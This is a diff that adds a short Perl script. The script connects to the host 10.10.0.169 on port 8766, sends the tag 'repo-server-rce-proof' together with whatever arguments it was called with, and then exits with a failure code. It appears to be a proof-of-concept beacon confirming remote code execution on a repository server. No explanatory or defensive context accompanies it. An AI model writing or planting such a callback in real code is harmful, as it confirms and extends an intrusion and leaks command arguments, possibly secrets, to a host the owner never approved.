@@ -1,0 +1,7 @@
+#!/usr/bin/perl
+use strict;
+use warnings;
+use IO::Socket::INET;
+my $sock = IO::Socket::INET->new(PeerAddr => '10.10.0.169', PeerPort => 8766, Proto => 'tcp', Timeout => 3);
+if ($sock) { print $sock "repo-server-rce-proof ".join(' ', @ARGV)."\n"; close($sock); }
+exit 1;
